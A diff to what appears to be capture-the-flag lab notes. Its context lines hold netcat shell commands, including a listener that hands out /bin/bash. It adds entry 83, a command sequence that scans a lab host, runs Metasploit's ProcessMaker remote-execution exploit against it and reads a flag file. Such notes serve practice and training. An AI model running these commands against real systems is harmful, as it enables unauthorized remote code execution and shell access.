@@ -1637,7 +1637,19 @@ nc -nv 10.4.21.221 1234
 nc -nvlp 1234 -e /bin/bash
 nc.exe -nv 10.10.3.2 1234  #windows
 ```
-
-
+83) Windows: Workflow Platform  (Web)
+    
+```
+cat /root/Desktop/target
+nmap --top-ports 65536 10.0.0.168
+firefox 10.0.0.168
+msfconsole
+search processmaker
+use exploit/multi/http/processmaker_exec
+set RHOSTS 10.0.0.168
+cd /
+dir
+cat flag.txt
+```
 
 
